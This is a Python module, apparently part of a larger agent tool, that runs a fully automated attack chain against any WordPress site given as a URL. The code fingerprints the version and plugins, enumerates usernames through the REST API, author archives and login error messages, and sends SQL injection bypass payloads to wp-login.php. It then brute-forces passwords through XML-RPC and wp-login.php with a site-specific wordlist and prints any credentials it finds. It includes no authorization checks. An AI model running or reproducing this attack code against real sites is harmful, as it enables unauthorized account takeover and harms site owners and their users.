"""
WordPress-specific end-to-end attack chain for T.
Runs the full sequence automatically:
1. Fingerprint + version
2. Username enumeration (REST API + author archives + error differentiation)  
3. Plugin/theme CVE detection
4. SQL injection test
5. XML-RPC brute force with contextual wordlist
6. Contextual wordlist brute force via wp-login.php
Returns a structured result — no fabricated output ever.
"""

import asyncio
import httpx
import re
import json
from agents.wordlist import generate as build_wordlist
from core.logger import get_logger

log = get_logger("agents.wp_attack")

_UA      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
_HEADERS = {"User-Agent": _UA, "Accept": "text/html,*/*;q=0.8"}
_TIMEOUT = httpx.Timeout(15.0)


async def full_attack(target_url: str, **_) -> str:
    """
    Full automated WordPress attack chain.
    target_url: wp-login.php URL or site base URL.
    """
    base  = _base(target_url)
    login = f"{base}/wp-login.php"
    lines = [f"WordPress Attack — {base}\n{'='*50}"]

    async with httpx.AsyncClient(
        timeout=_TIMEOUT,
        headers=_HEADERS,
        follow_redirects=True,
    ) as c:

        # ── Step 1: Fingerprint ──────────────────────────────────────────────
        lines.append("\n[1] Fingerprint")
        version, plugins, theme, emails = await _fingerprint(c, base)
        lines.append(f"  WordPress version : {version or 'unknown'}")
        lines.append(f"  Theme             : {theme or 'unknown'}")
        lines.append(f"  Plugins detected  : {plugins[:8]}")
        lines.append(f"  Emails found      : {emails}")

        # ── Step 2: Username enumeration ────────────────────────────────────
        lines.append("\n[2] Username Enumeration")
        usernames = await _enumerate_users(c, base, login)
        if usernames:
            lines.append(f"  Confirmed usernames: {usernames}")
        else:
            lines.append("  No usernames confirmed via API/archives. Trying common names.")
            usernames = ["admin", "administrator", "user", "editor", "webmaster"]

        # ── Step 3: Plugin CVE check ─────────────────────────────────────────
        lines.append("\n[3] Plugin Vulnerability Check")
        vuln_plugins = await _check_plugin_vulns(c, base, plugins)
        if vuln_plugins:
            for vp in vuln_plugins:
                lines.append(f"  VULNERABLE: {vp}")
        else:
            lines.append("  No obvious vulnerable plugins detected")

        # ── Step 4: SQL injection ────────────────────────────────────────────
        lines.append("\n[4] SQL Injection Test")
        sqli_result = await _test_sqli(c, login, usernames[0] if usernames else "admin")
        lines.append(f"  {sqli_result}")

        # ── Step 5: Build contextual wordlist ────────────────────────────────
        lines.append("\n[5] Contextual Wordlist")
        domain    = base.replace("https://", "").replace("http://", "").split("/")[0]
        wordlist  = build_wordlist(
            domain=domain,
            usernames=usernames,
            emails=emails,
        )
        lines.append(f"  Generated {len(wordlist)} contextual passwords")
        lines.append(f"  First 10: {wordlist[:10]}")

        # ── Step 6: XML-RPC brute force ──────────────────────────────────────
        lines.append("\n[6] XML-RPC Brute Force")
        xmlrpc_url = f"{base}/xmlrpc.php"
        xmlrpc_r   = await c.get(xmlrpc_url)
        if xmlrpc_r.status_code == 200 and "xml" in xmlrpc_r.text.lower():
            lines.append("  XML-RPC enabled — attempting brute force")
            found = await _xmlrpc_brute(base, usernames, wordlist)
            if found:
                u, p = found
                lines.append(f"\n  ✓ CREDENTIALS FOUND via XML-RPC")
                lines.append(f"  Username : {u}")
                lines.append(f"  Password : {p}")
                lines.append(f"  Login at : {login}")
                return "\n".join(lines)
            else:
                lines.append("  XML-RPC brute force: no match in wordlist")
        else:
            lines.append(f"  XML-RPC not available ({xmlrpc_r.status_code})")

        # ── Step 7: wp-login.php brute force (limited, careful) ─────────────
        lines.append("\n[7] wp-login.php Brute Force (top 30 candidates)")
        found = await _wplogin_brute(c, login, usernames, wordlist[:30])
        if found:
            u, p = found
            lines.append(f"\n  ✓ CREDENTIALS FOUND via wp-login.php")
            lines.append(f"  Username : {u}")
            lines.append(f"  Password : {p}")
            lines.append(f"  Login at : {login}")
            return "\n".join(lines)
        else:
            lines.append("  No match in top candidates")

        lines.append("\n[RESULT] No credentials found with available methods.")
        lines.append("Remaining options:")
        lines.append("  • Expand wordlist with more site-specific terms")
        lines.append("  • Check exposed backup/config files")
        lines.append(f"  • Review vulnerable plugins: {vuln_plugins or 'none detected'}")
        lines.append("  • Password reset via email if email address is known")

    return "\n".join(lines)


# ─── Internal helpers ──────────────────────────────────────────────────────────

def _base(url: str) -> str:
    url = url.rstrip("/")
    url = re.sub(r'/wp-login\.php.*$', '', url)
    if not url.startswith("http"):
        url = "https://" + url
    return url


async def _fingerprint(c: httpx.AsyncClient, base: str) -> tuple:
    """Extract version, plugins, theme, emails from site."""
    version = None
    plugins = []
    theme   = None
    emails  = []

    try:
        # Version from feed
        r = await c.get(f"{base}/feed/", timeout=10.0)
        m = re.search(r'generator.*?WordPress\s*([\d.]+)', r.text, re.IGNORECASE)
        if m:
            version = m.group(1)

        # Version from meta tag
        if not version:
            r2 = await c.get(base, timeout=10.0)
            m2 = re.search(r'<meta[^>]+generator[^>]+WordPress\s*([\d.]+)', r2.text, re.IGNORECASE)
            if m2:
                version = m2.group(1)
            # Emails
            emails = list(set(re.findall(r'[\w.+-]+@[\w-]+\.[a-z]{2,}', r2.text)))[:5]
            # Theme
            tm = re.search(r'/wp-content/themes/([^/]+)/', r2.text)
            if tm:
                theme = tm.group(1)
            # Plugins from source
            plugin_refs = re.findall(r'/wp-content/plugins/([^/]+)/', r2.text)
            plugins = list(dict.fromkeys(plugin_refs))[:20]

        # Version from readme (sometimes works)
        if not version:
            r3 = await c.get(f"{base}/readme.html", timeout=8.0)
            m3 = re.search(r'Version\s*([\d.]+)', r3.text)
            if m3:
                version = m3.group(1)

    except Exception as e:
        log.warning(f"fingerprint error: {e}")

    return version, plugins, theme, emails


async def _enumerate_users(c: httpx.AsyncClient, base: str, login: str) -> list[str]:
    found = set()

    # REST API
    try:
        r = await c.get(f"{base}/wp-json/wp/v2/users?per_page=100", timeout=10.0)
        if r.status_code == 200:
            for u in r.json():
                slug = u.get("slug") or u.get("name", "")
                if slug:
                    found.add(slug)
                    # Also add email local part if email found
                    email = u.get("email", "")
                    if email:
                        found.add(email.split("@")[0])
    except Exception:
        pass

    # Author archive (IDs 1–5)
    async def check_author(uid):
        try:
            r = await c.get(f"{base}/?author={uid}", timeout=8.0)
            m = re.search(r'/author/([^/?"]+)', str(r.url))
            if m:
                found.add(m.group(1))
        except Exception:
            pass

    await asyncio.gather(*[check_author(i) for i in range(1, 6)])

    # Login error differentiation — "invalid username" vs "wrong password"
    test_names = list(found) or ["admin", "administrator", "editor", "webmaster", "user"]
    try:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as lc:
            page   = await lc.get(login, headers=_HEADERS)
            csrf   = _extract_csrf(page.text)
            cooks  = dict(page.cookies)
            for name in test_names[:8]:
                data = {"log": name, "pwd": "xK9#mP2$qL5_wrong_xyz", "wp-submit": "Log In", **csrf}
                r = await lc.post(login, data=data, headers=_HEADERS, cookies=cooks)
                body = r.text.lower()
                if "incorrect password" in body or "the password you entered" in body:
                    found.add(name)
    except Exception:
        pass

    return sorted(found)


async def _check_plugin_vulns(
    c: httpx.AsyncClient, base: str, plugins: list[str]
) -> list[str]:
    """Check known vulnerable plugin versions."""
    # Known vulnerable plugin versions (name → (max_safe_version, CVE))
    known_vulns = {
        "really-simple-ssl":      ("9.0.0",  "CVE-2024-10924 — auth bypass"),
        "really-simple-security": ("9.0.0",  "CVE-2024-10924 — auth bypass"),
        "wordfence":              ("7.10.0", "various — check wpscan"),
        "contact-form-7":         ("5.7.0",  "CVE-2020-35489 — file upload"),
        "woocommerce":            ("8.0.0",  "check wpscan for version-specific CVEs"),
        "elementor":              ("3.13.0", "CVE-2023-48777 — auth bypass"),
        "wpforms-lite":           ("1.8.0",  "various — check wpscan"),
        "yoast-seo":              ("20.0",   "various — check wpscan"),
    }

    found_vulns = []
    for plugin in plugins:
        if plugin.lower() in known_vulns:
            _, cve = known_vulns[plugin.lower()]
            # Try to get exact version
            try:
                r = await c.get(
                    f"{base}/wp-content/plugins/{plugin}/readme.txt",
                    timeout=6.0,
                )
                if r.status_code == 200:
                    vm = re.search(r'Stable tag:\s*([\d.]+)', r.text, re.IGNORECASE)
                    ver = vm.group(1) if vm else "unknown version"
                    found_vulns.append(f"{plugin} v{ver} — {cve}")
            except Exception:
                found_vulns.append(f"{plugin} (version unknown) — {cve}")

    return found_vulns


async def _test_sqli(c: httpx.AsyncClient, login: str, username: str) -> str:
    """Quick SQLi test — returns one-line result."""
    payloads = [
        ("' OR '1'='1", "' OR '1'='1"),
        ("admin'--",    "x"),
        ("' OR 1=1--",  "x"),
    ]
    try:
        page  = await c.get(login, timeout=10.0)
        csrf  = _extract_csrf(page.text)
        cooks = dict(page.cookies)

        # Baseline
        bad  = {"log": "xnot_real_user_xyz", "pwd": "wrongpass", "wp-submit": "Log In", **csrf}
        base_r = await c.post(login, data=bad, headers=_HEADERS, cookies=cooks)
        base_loc = base_r.headers.get("location", "")

        for uname, passwd in payloads:
            data = {"log": uname, "pwd": passwd, "wp-submit": "Log In", **csrf}
            r    = await c.post(login, data=data, headers=_HEADERS, cookies=cooks)
            loc  = r.headers.get("location", "")
            if loc != base_loc and "wp-admin" in loc.lower():
                return f"POSSIBLE SQLi bypass — payload={uname!r} redirect={loc}"

        return "No SQLi bypass detected (all redirects match baseline)"
    except Exception as e:
        return f"SQLi test error: {e}"


async def _xmlrpc_brute(
    base: str, usernames: list[str], wordlist: list[str]
) -> tuple[str, str] | None:
    """Brute force XML-RPC. Returns (username, password) or None."""
    url     = f"{base}/xmlrpc.php"
    headers = {"Content-Type": "text/xml", "User-Agent": _UA}

    async def attempt(client, username, password) -> bool:
        payload = (
            '<?xml version="1.0"?>'
            '<methodCall><methodName>wp.getUsersBlogs</methodName><params>'
            f'<param><value><string>{username}</string></value></param>'
            f'<param><value><string>{password}</string></value></param>'
            '</params></methodCall>'
        )
        try:
            r = await client.post(url, content=payload, headers=headers, timeout=8.0)
            return "faultCode" not in r.text and "isAdmin" in r.text
        except Exception:
            return False

    async with httpx.AsyncClient(follow_redirects=True) as c:
        for username in usernames:
            for password in wordlist:
                if await attempt(c, username, password):
                    return (username, password)
                await asyncio.sleep(0.2)

    return None


async def _wplogin_brute(
    c: httpx.AsyncClient,
    login: str,
    usernames: list[str],
    wordlist: list[str],
) -> tuple[str, str] | None:
    """
    Brute force wp-login.php carefully.
    Returns (username, password) or None.
    Only use for top candidates — subject to rate limiting.
    """
    for username in usernames:
        for password in wordlist:
            try:
                # Fresh page load per attempt to get valid nonce
                page  = await c.get(login, timeout=10.0)
                csrf  = _extract_csrf(page.text)
                cooks = dict(page.cookies)
                data  = {"log": username, "pwd": password, "wp-submit": "Log In",
                         "redirect_to": "/wp-admin/", **csrf}

                async with httpx.AsyncClient(
                    timeout=10.0, follow_redirects=False
                ) as lc:
                    r   = await lc.post(login, data=data, headers=_HEADERS, cookies=cooks)
                    loc = r.headers.get("location", "")
                    if "wp-admin" in loc.lower() and "loggedout" not in loc.lower():
                        return (username, password)

                await asyncio.sleep(0.5)
            except Exception:
                continue

    return None


def _extract_csrf(html: str) -> dict:
    patterns = [
        r'<input[^>]+name=["\'](_wpnonce|wpnonce|_token|csrf_token)["\'][^>]+value=["\']([^"\']+)["\']',
        r'<input[^>]+value=["\']([^"\']{10,})["\'][^>]+name=["\'](_wpnonce|wpnonce)["\']',
    ]
    for pat in patterns:
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            groups = m.groups()
            known  = {"_wpnonce", "wpnonce", "_token", "csrf_token"}
            if groups[0] in known:
                return {groups[0]: groups[1]}
            return {groups[1]: groups[0]}
    return {}
